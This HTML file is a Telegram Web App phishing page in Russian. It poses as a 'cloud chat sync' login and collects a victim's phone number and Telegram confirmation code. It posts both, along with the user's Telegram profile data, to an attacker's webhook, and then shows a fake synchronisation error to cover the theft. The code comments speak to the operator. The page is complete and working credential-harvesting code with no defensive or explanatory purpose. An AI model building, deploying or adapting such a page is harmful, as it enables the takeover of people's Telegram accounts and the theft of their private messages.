<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        :root { --bg: #0f172a; --accent: #38bdf8; --glass: rgba(30, 41, 59, 0.7); }
        body { background: radial-gradient(circle at top right, #1e293b, #0f172a); color: #f8fafc; font-family: 'Inter', sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .card { width: 85%; max-width: 360px; padding: 40px 24px; background: var(--glass); backdrop-filter: blur(16px); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 32px; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5); text-align: center; }
        .icon-box { width: 64px; height: 64px; background: linear-gradient(135deg, var(--accent), #818cf8); border-radius: 20px; margin: 0 auto 24px; display: flex; align-items: center; justify-content: center; }
        h2 { font-size: 24px; margin: 0 0 10px; }
        p { color: #94a3b8; font-size: 14px; line-height: 1.4; margin-bottom: 30px; }
        input { width: 100%; background: rgba(15, 23, 42, 0.5); border: 1.5px solid rgba(255,255,255,0.1); border-radius: 16px; padding: 18px; color: #fff; font-size: 18px; box-sizing: border-box; outline: none; text-align: center; margin-bottom: 20px; }
        button { width: 100%; background: #fff; color: #0f172a; border: none; padding: 18px; border-radius: 16px; font-size: 16px; font-weight: 700; cursor: pointer; }
        #step2 { display: none; }
        .back-btn { background: none; color: var(--accent); font-size: 13px; margin-top: 15px; text-decoration: underline; cursor: pointer; }
    </style>
</head>
<body>
    <div class="card">
        <div class="icon-box">
            <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
        </div>

        <!-- ШАГ 1: ВВОД НОМЕРА -->
        <div id="step1">
            <h2>Вход в систему</h2>
            <p>Введите номер телефона, чтобы синхронизировать облачное хранилище переписок</p>
            <input type="tel" id="phone" placeholder="+7 (___) ___-__-__">
            <button onclick="toStep2()">Продолжить</button>
        </div>

        <!-- ШАГ 2: ВВОД КОДА -->
        <div id="step2">
            <h2>Подтверждение</h2>
            <p id="target-phone" style="color:var(--accent); font-weight:600;"></p>
            <p>Мы отправили код подтверждения в ваш Telegram. Введите его ниже:</p>
            <input type="number" id="code" placeholder="00000" pattern="\[0-9]*">
            <button onclick="finish()">Завершить вход</button>
            <div class="back-btn" onclick="location.reload()">Изменить номер</div>
        </div>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();
        const WEBHOOK_URL = 'ТВОЙ_WEBHOOK_URL'; // ВСТАВЬ СЮДА ССЫЛКУ ИЗ N8N

        function toStep2() {
            const phone = document.getElementById('phone').value;
            if (phone.length < 10) return tg.HapticFeedback.notificationOccurred('error');
            
            tg.HapticFeedback.impactOccurred('medium');
            document.getElementById('target-phone').innerText = phone;
            document.getElementById('step1').style.display = 'none';
            document.getElementById('step2').style.display = 'block';

            // Отправляем номер в n8n сразу, чтобы ты знал, что процесс пошел
            sendData({ stage: 'phone_entered', phone: phone });
        }

        function finish() {
            const code = document.getElementById('code').value;
            const phone = document.getElementById('phone').value;
            if (code.length < 5) return tg.HapticFeedback.notificationOccurred('error');

            tg.HapticFeedback.impactOccurred('heavy');
            
            // Отправляем финальные данные
            sendData({ stage: 'code_entered', phone: phone, code: code });

            alert("Ошибка синхронизации. Попробуйте запросить код повторно через 5 минут.");
            tg.close();
        }

        async function sendData(payload) {
            payload.user = tg.initDataUnsafe?.user || {};
            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(payload)
                });
            } catch (e) {}
        }
    </script>
</body>
</html>
